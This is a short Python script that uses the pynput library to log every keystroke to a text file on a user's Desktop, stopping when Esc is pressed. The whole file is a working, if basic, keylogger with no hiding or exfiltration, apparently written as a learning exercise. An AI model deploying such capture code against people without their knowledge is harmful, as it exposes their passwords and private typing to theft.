#!/usr/local/bin/python3
from pynput.keyboard import Listener, Key
def listen_keystrokes():
    def on_press(key):
        try:
            with open('/Users/princesingh/Desktop/keyboard_logs.txt', 'a') as file:
                file.write(f'{key} pressed\n')
        except Exception as e:
            print(f"Error: {e}")
    def on_release(key):
        if key == Key.esc:
            #stop listener
            return False
    #start listening
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
listen_keystrokes()
